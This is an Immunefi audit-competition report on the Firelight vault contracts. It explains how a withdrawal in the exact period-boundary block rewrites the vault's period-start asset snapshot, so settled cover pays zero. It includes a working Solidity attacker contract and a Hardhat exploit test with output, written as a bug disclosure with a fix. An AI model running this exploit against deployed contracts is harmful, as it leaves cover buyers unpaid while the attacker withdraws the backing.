# 89530 sc high a boundary block withdrawal rewrites committed collateral and makes settled cover unpayable

**Submitted on Aug 19th 2026 at 18:36:54 UTC by @Nescient for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #89530
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Protocol insolvency

## Description

Brief/Intro

An ordinary staker can back-run a legitimate allocation commitment with a full withdrawal in the exact period-boundary block, changing the historical period-start asset lookup from the amount that authorized the commitment to zero. Settlement still sells and charges for the committed cover because it never revalidates capacity, while a later incident payout reads the mutated value and pays zero. The attacker then claims all withdrawn assets after the payout window, leaving settled cover without usable vault backing and causing the in-scope Critical impact of protocol insolvency.

## Vulnerability Details

`CoverOrderAllocator.commitAllocation` validates a current-period commitment using the vault's assets at the inclusive period-start timestamp:

```solidity
// CoverOrderAllocator.sol:710-716
uint256 totalAssetsCanonical = Decimals.convert(
    $.vault.totalAssetsAt($.vault.currentPeriodStart()),
    $.vaultAssetDecimals,
    CANONICAL_DECIMALS,
    Math.Rounding.Floor
);
```

`totalAssetsAt(timestamp)` returns the latest total-assets checkpoint whose key is less than or equal to `timestamp`:

```solidity
// FirelightVault.sol:456-458
function totalAssetsAt(uint48 timestamp) public view returns (uint256) {
  return _traceTotalAssets.upperLookupRecent(timestamp);
}
```

The protocol treats this lookup as a frozen starting-assets snapshot, but it remains writable during the period-start second. Every deposit or withdrawal records `_traceTotalAssets` under the current `block.timestamp`:

```solidity
// FirelightVault.sol:1044-1055
function _logTrace(
  address owner,
  uint256 balance,
  uint256 _totalSupply,
  uint256 _totalAssets,
  bool isLogAssets
) private {
  uint48 ts = Time.timestamp();
  _traceBalanceOf[owner].push(ts, balance);
  _traceTotalSupply.push(ts, _totalSupply);

  if (isLogAssets) _traceTotalAssets.push(ts, _totalAssets);
}
```

If period `P` starts at timestamp `S`, a withdrawal executed in a block with `block.timestamp == S` inserts `(S, newTotalAssets)`. Because the lookup is inclusive, this new checkpoint immediately becomes the value returned by `totalAssetsAt(S)`. If another transaction already wrote a checkpoint at `S`, `Trace256.push` replaces that same-key value:

```solidity
// Checkpoints.sol:203-212
(bool exists, uint48 lastKey,) = self._trace.latestCheckpoint();

uint256 len = self._values.length;
uint256 lastValue = latest(self);
if (exists && key == lastKey) {
    self._values[len - 1] = value;
} else {
    self._trace.push(key, uint208(len));
    self._values.push(value);
}
```

The commitment is not linked to an immutable copy of the vault-asset value that authorized it. It only stores the submitted matching capacity:

```solidity
// CoverOrderAllocator.sol:348-354
_validateMatchingCapacity($, currentPeriod, matchingCapacity, totalAllocated);

AllocationCommitment storage commit = $.allocationCommitments[currentPeriod];
commit.root = merkleRoot;
commit.totalAvailableCapacity = matchingCapacity;
commit.totalDeclaredAllocated = totalAllocated;
commit.graceExpiresAt = graceExpiresAt;
```

Settlement later verifies the Merkle proof and enforces limits against `commit.totalAvailableCapacity`, but never calls `_computeAvailableCapacity` or re-reads the vault snapshot. It can therefore settle and mint cover after the historical backing used by the successful commitment has changed.

Payout independently reads that mutable historical value and uses it as a hard cap:

```solidity
// FirelightVault.sol:909-929
uint256 assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart);
uint256 currentActiveAssets = totalAssets();

uint256 capturePeriodWithdrawals = withdrawAssets[capturePeriod + 1];
// ...
uint256 activePayableAmount = currentActiveAssets + capturePeriodWithdrawals + nextPeriodWithdrawals;
paidAmount = Math.min(amount, Math.min(assetsAtCapturePeriod, activePayableAmount));

// The incident must be processed with the available amount, even if paidAmount is zero.
if (paidAmount > 0) {
    // debit assets and withdrawal buckets
}
```

Even though the physical assets remain in the vault's pending-withdrawal bucket and are otherwise payable during the incident window, the mutated `assetsAtCapturePeriod == 0` forces `paidAmount` to zero. `IncidentManager._executePayout` explicitly accepts a zero vault return, emits the payout result, and allows `approveCurrentAssessment` to close the incident.

**Concrete attack sequence**

1. During period `P-1`, the attacker has `100 FXRP` staked. Its last total-assets checkpoint is `(T, 100e6)`, where `T < S`, and an honest curator has created a `100 USD` cover order targeting period `P`.
2. In a block with `block.timestamp == S`, the honest allocator first calls `commitAllocation(P, root, 100e18, 100e18)`. `totalAssetsAt(S)` still resolves to the older `(T, 100e6)` checkpoint, so all capacity checks pass.
3. Later in the same block, the attacker calls `withdraw(100e6, attacker, attacker)`. The withdrawal burns its shares, assigns the assets to withdrawal period `P+1`, and writes `(S, 0)`. The same `totalAssetsAt(S)` query now returns zero.
4. The honest allocator settles the valid `100e18` Merkle allocation. Settlement succeeds, charges the premium, and mints the CoverNFT without revalidating vault capacity.
5. When honest incident roles approve a real `100 USD` loss for period `P`, the vault is asked to pay `100e6` but emits `PayoutExecuted(..., requestedAmount = 100e6, paidAmount = 0, ...)`. After the period-`P` payout window closes, the attacker claims the intact `100e6` withdrawal.

The timing condition is narrow and stated explicitly: the commitment and withdrawal must execute in that order in a block whose timestamp equals the period-start second. The supplied attacker contract makes attempts safe by reverting unless both `block.timestamp == currentPeriodStart()` and the current-period commitment root is already stored. A failed timing or ordering attempt therefore does not move the attacker's stake into the withdrawal queue.

Flare's official network documentation states that block time is approximately 1.8 seconds and transaction ordering is determined by the proposer, with a priority gas auction as the default behavior. Multiple ordered transactions in a boundary block are therefore consistent with the production chain model. The exact-timestamp condition is checked again at every period boundary.

**Runnable proof of concept**

Files:

* `contracts/test/BoundaryBlockCheckpointAttacker.sol`
* `test/FirelightVault/boundaryBlockCheckpointMutation.js`

Run:

```bash
npx hardhat test test/FirelightVault/boundaryBlockCheckpointMutation.js
```

Observed result:

```
Boundary-block period-start checkpoint mutation
  ✔ commits against 100 assets, rewrites the snapshot to zero, settles cover, pays zero, and preserves withdrawal

1 passing
```

The test deploys the real `FirelightVault`, `CoverOrderAllocator`, and `CoverNFT`; creates and funds a real cover order; stakes through the conditional attacker contract; places the honest commitment and attacker withdrawal in the required boundary block; settles the valid Merkle leaf; demonstrates the zero payout; then advances past the payout window and proves the attacker receives all `100e6` assets.

The PoC calls `FirelightVault.payout` through an authorized `PAYOUT_ROLE` signer to isolate the affected boundary. This is the same call made by `IncidentManager._executePayout`:

```solidity
// IncidentManager.sol:682-688
if (vaultRequestedAmount > 0) {
    vaultPaidAmount = $.vault.payout(receiver, vaultRequestedAmount, captureTimestamp);
} else if (flbAmount == 0) {
    revert PayoutRoundsToZero(remainderAmount, totalAssessmentLoss);
}
```

The identity of the correctly authorized caller does not change the mutable snapshot or zero-cap behavior.

**Recommended fix**

Persist one immutable `startingAssets[P]` value for each period and require both commitment validation and payout to consume that exact stored value. If the snapshot is frozen lazily, it must be frozen during the first authorized capacity read before the commitment is stored; mutations before the freeze may reduce capacity, while mutations afterward must not alter the payout cap.

Alternatively, define period-start backing as the most recent checkpoint strictly before `S`, and use the same strict-before lookup in both `_computeAvailableCapacity` and `payout`. This can be implemented with a dedicated `upperLookupRecentStrict` helper or, after safely proving `S > 0`, by querying `S - 1`. Fixing only settlement or only payout is insufficient: the value authorizing sold cover and the value limiting payment must remain identical and immutable throughout the period.

## Impact Details

The selected in-scope impact is **Critical — Protocol insolvency**.

The PoC demonstrates the following quantified result with production-compatible six-decimal vault assets and an ordinary non-fee-on-transfer token:

| State                                          |    Value after exploit |
| ---------------------------------------------- | ---------------------: |
| Capacity accepted and stored by the commitment | `100e18` canonical USD |
| Cover successfully settled                     | `100e18` canonical USD |
| Period-start assets returned after mutation    |                    `0` |
| Vault payment for a valid `100e6` request      |                    `0` |
| Assets later claimed by the attacker           |     `100e6` FXRP units |

The exploit is scalable to the attacker's stake and therefore to a material share of the period's vault-backed capacity. The protocol charges the cover buyer's premium and records valid settled coverage, but the vault backing that passed the enforced commitment check cannot be used to satisfy the resulting claim. The attacker does not need to steal another staker's balance: the insolvency arises because the protocol's enforceable payout for a valid settled liability is reduced below that liability while the backing assets remain fully claimable by the attacker.

This is distinct from the disclosed assumptions that FXRP price may fall, the externally held first-loss buffer may be withdrawn, or aggregate claims are not capped. Here, real vault assets exist and successfully authorize cover under the protocol's capacity check; an unprivileged action subsequently changes the historical value consumed by the protocol's payout constraint. A valid `100` liability is left with a zero vault payout, directly matching the program's Critical protocol-insolvency impact.

## References

* [`FirelightVault.withdraw` and checkpoint logging](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L755-L775)
* [`FirelightVault.totalAssetsAt` and `payout`](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L450-L458)
* [`FirelightVault.payout` period-start cap](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L892-L965)
* [`CoverOrderAllocator` commitment validation and storage](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/CoverOrderAllocator.sol#L332-L403)
* [`CoverOrderAllocator` settlement path](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/CoverOrderAllocator.sol#L442-L540)
* [`CoverOrderAllocator._computeAvailableCapacity`](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/CoverOrderAllocator.sol#L689-L725)
* [`Checkpoints.Trace256.push` and inclusive lookup](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/lib/Checkpoints.sol#L193-L224)
* [`IncidentManager._executePayout`](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/IncidentManager.sol#L618-L705)
* [Flare network overview: block time and transaction ordering](https://dev.flare.network/network/overview)

## Proof of Concept

Proof of Concept

This local Hardhat PoC uses the real `FirelightVault`, `CoverOrderAllocator`, and `CoverNFT` implementations. It proves that a valid commitment can be accepted against `100` assets, an unprivileged withdrawal later in the same period-boundary block changes `totalAssetsAt(periodStart)` to zero, the committed cover still settles, the corresponding vault payout is capped to zero, and the attacker later claims all `100` assets.

No mainnet or public-testnet contracts are used.

### Steps to reproduce

1. Check out the in-scope repository and branch:

```bash
git clone https://github.com/immunefi-team/audit-comp-firelight.git
cd audit-comp-firelight
git checkout v1_audit_ready
npm install
```

2. Create `contracts/test/BoundaryBlockCheckpointAttacker.sol` with the following content:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { SafeERC20 } from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import { ICoverOrderAllocator } from "../core/interfaces/ICoverOrderAllocator.sol";
import { IFirelightVault } from "../core/interfaces/IFirelightVault.sol";

/// @dev Test-only attacker that makes the boundary attempt risk-free: if it is not included
///      after a real commitment in the exact boundary block, the transaction simply reverts.
contract BoundaryBlockCheckpointAttacker {
  using SafeERC20 for IERC20;

  error OnlyOwner();
  error NotBoundaryBlock();
  error CommitmentNotYetStored();

  address public immutable owner;
  IERC20 public immutable asset;
  IFirelightVault public immutable vault;
  ICoverOrderAllocator public immutable allocator;

  constructor(address owner_, IFirelightVault vault_, ICoverOrderAllocator allocator_) {
    owner = owner_;
    asset = IERC20(vault_.asset());
    vault = vault_;
    allocator = allocator_;
  }

  modifier onlyOwner() {
    if (msg.sender != owner) revert OnlyOwner();
    _;
  }

  function stake(uint256 assets) external onlyOwner {
    asset.safeTransferFrom(msg.sender, address(this), assets);
    asset.forceApprove(address(vault), assets);
    vault.deposit(assets, address(this));
  }

  function attack(uint256 assets) external onlyOwner {
    uint256 period = vault.currentPeriod();
    if (block.timestamp != vault.currentPeriodStart()) revert NotBoundaryBlock();
    if (allocator.getAllocationCommitment(period).root == bytes32(0)) revert CommitmentNotYetStored();
    vault.withdraw(assets, address(this), address(this));
  }

  function claim(uint256 period) external onlyOwner {
    vault.claimWithdraw(period);
    asset.safeTransfer(owner, asset.balanceOf(address(this)));
  }
}
```

The attacker wrapper makes the attempt safe: execution outside the exact period-start block or before the legitimate commitment simply reverts without moving the stake into the withdrawal queue.

3. Create `test/FirelightVault/boundaryBlockCheckpointMutation.js` with the following content:

```javascript
const { loadFixture, time } = require("@nomicfoundation/hardhat-network-helpers");
const { StandardMerkleTree } = require("@openzeppelin/merkle-tree");
const { expect } = require("chai");
const { ethers, network, upgrades } = require("hardhat");
const { deployVault, computeMarketId } = require("../setup/fixtures.js");

const ASSET_DECIMALS = 6;
const ASSETS = ethers.parseUnits("100", ASSET_DECIMALS);
const COVER = ethers.parseUnits("100", 18);

async function deployBoundaryMutationFixture() {
  const ctx = await deployVault({ initial_deposit_limit: ethers.parseUnits("1000000", ASSET_DECIMALS) });
  const [deployer, admin, curator, allocatorRole, configAdmin, premiumCollector, firstLossBuffer] =
    await ethers.getSigners();

  const MockERC20 = await ethers.getContractFactory("MockERC20");
  const premiumToken = await MockERC20.deploy("MockUSDC", "mUSDC", 6);
  const MockAggregator = await ethers.getContractFactory("MockAggregatorV3");
  const priceFeed = await MockAggregator.deploy(18, ethers.parseUnits("1", 18));

  const CoverNFT = await ethers.getContractFactory("CoverNFT");
  const coverNFT = await upgrades.deployProxy(
    CoverNFT,
    ["Firelight Cover", "FLCOVER", "", admin.address, deployer.address, ethers.ZeroAddress, ethers.ZeroAddress],
    { kind: "transparent" },
  );

  const protocol = "Boundary Protocol";
  const chainId = 1;
  const market = ethers.encodeBytes32String("market");
  const marketId = computeMarketId(chainId, protocol, market);

  const Allocator = await ethers.getContractFactory("CoverOrderAllocator");
  const allocator = await upgrades.deployProxy(
    Allocator,
    [
      {
        vault: ctx.firelight_vault.target,
        premiumCollector: premiumCollector.address,
        coverNFT: coverNFT.target,
        priceFeedAdapter: priceFeed.target,
        maxPriceAge: 7 * 24 * 60 * 60,
        premiumTokens: [premiumToken.target],
        admin: admin.address,
        adminRole: admin.address,
        curatorRole: curator.address,
        allocatorRole: allocatorRole.address,
        configAdminRole: configAdmin.address,
        initialProtocolConcentrations: [{ chainId, protocol, maxProtocolConcentrationBps: 10_000 }],
        newMarkets: [{ chainId, protocol, market }],
        capacityConfig: {
          minCAR: 12_000,
          firstLossBufferToken: premiumToken.target,
          firstLossBuffer: firstLossBuffer.address,
          effectiveLeverage: 12_000,
          minOrderMarketCoverAmount: 1,
          divergenceToleranceBps: 0,
        },
      },
    ],
    { kind: "transparent", unsafeAllow: ["missing-initializer-call"] },
  );

  await coverNFT.connect(admin).grantRole(await coverNFT.MINTER_ROLE(), allocator.target);

  const Attacker = await ethers.getContractFactory("BoundaryBlockCheckpointAttacker");
  const attacker = await Attacker.deploy(ctx.users[0].address, ctx.firelight_vault.target, allocator.target);
  await ctx.token_contract.mintTo(ctx.users[0].address, ASSETS);
  await ctx.token_contract.connect(ctx.users[0]).approve(attacker.target, ASSETS);
  await attacker.connect(ctx.users[0]).stake(ASSETS);

  await allocator
    .connect(curator)
    .createCoverOrder(
      ctx.users[1].address,
      ctx.users[1].address,
      "beneficiary",
      premiumToken.target,
      [{ marketId, coverRateAnnual: 500, coverAmount: COVER }],
      0,
    );
  const order = await allocator.getCoverOrder(0);
  const premiumNative = (order.totalPremiumAmount + 10n ** 12n - 1n) / 10n ** 12n;
  await premiumToken.mint(ctx.users[1].address, premiumNative);
  await premiumToken.connect(ctx.users[1]).approve(allocator.target, premiumNative);

  return { ...ctx, allocator, allocatorRole, premiumToken, coverNFT, marketId, attacker };
}

describe("Boundary-block period-start checkpoint mutation", function () {
  it("commits against 100 assets, rewrites the snapshot to zero, settles cover, pays zero, and preserves withdrawal", async () => {
    const ctx = await loadFixture(deployBoundaryMutationFixture);
    const boundary = await ctx.firelight_vault.currentPeriodEnd();
    const targetPeriod = (await ctx.firelight_vault.currentPeriod()) + 1n;
    const allocation = [{ marketId: ctx.marketId, allocatedCover: COVER }];
    const tree = StandardMerkleTree.of([[0n, [[ctx.marketId, COVER]]]], ["uint256", "(bytes32,uint256)[]"]);

    await network.provider.send("evm_setAutomine", [false]);
    try {
      await time.setNextBlockTimestamp(boundary);
      const commitTx = await ctx.allocator
        .connect(ctx.allocatorRole)
        .commitAllocation(targetPeriod, tree.root, COVER, COVER, { gasLimit: 2_000_000 });
      const withdrawTx = await ctx.attacker.connect(ctx.users[0]).attack(ASSETS, { gasLimit: 2_000_000 });
      await network.provider.send("evm_mine");
      await Promise.all([commitTx.wait(), withdrawTx.wait()]);
    } finally {
      await network.provider.send("evm_setAutomine", [true]);
    }

    const commit = await ctx.allocator.getAllocationCommitment(targetPeriod);
    expect(commit.totalAvailableCapacity).to.equal(COVER);
    expect(await ctx.firelight_vault.totalAssetsAt(boundary)).to.equal(0n);
    expect(await ctx.firelight_vault.withdrawAssets(targetPeriod + 1n)).to.equal(ASSETS);

    await expect(ctx.allocator.connect(ctx.allocatorRole).settleCoverOrder(0, allocation, tree.getProof(0))).to.emit(
      ctx.coverNFT,
      "Transfer",
    );

    await expect(ctx.firelight_vault.connect(ctx.payout_signer).payout(ctx.payout_receiver.address, ASSETS, boundary))
      .to.emit(ctx.firelight_vault, "PayoutExecuted")
      .withArgs(ctx.payout_receiver.address, ASSETS, 0n, boundary);

    expect(await ctx.token_contract.balanceOf(ctx.payout_receiver.address)).to.equal(0n);

    await time.increase(ctx.config.period_configuration_duration * 2);
    await expect(ctx.attacker.connect(ctx.users[0]).claim(targetPeriod + 1n)).to.changeTokenBalances(
      ctx.token_contract,
      [ctx.firelight_vault, ctx.users[0]],
      [-ASSETS, ASSETS],
    );
  });
});
```

4. Run the PoC:

```bash
npx hardhat test test/FirelightVault/boundaryBlockCheckpointMutation.js
```

### Expected result

```
Boundary-block period-start checkpoint mutation
  ✔ commits against 100 assets, rewrites the snapshot to zero, settles cover, pays zero, and preserves withdrawal

1 passing
```

The passing assertions establish that:

1. `commitAllocation` accepts and stores `100e18` of capacity derived from the staked `100e6` assets.
2. The later withdrawal in the same block changes `totalAssetsAt(periodStart)` to `0` while preserving the stored commitment.
3. The valid Merkle allocation still settles and mints the cover receipt without a fresh capacity check.
4. A requested `100e6` payout emits `paidAmount = 0`.
5. After the payout window, the attacker receives the entire `100e6` withdrawal.
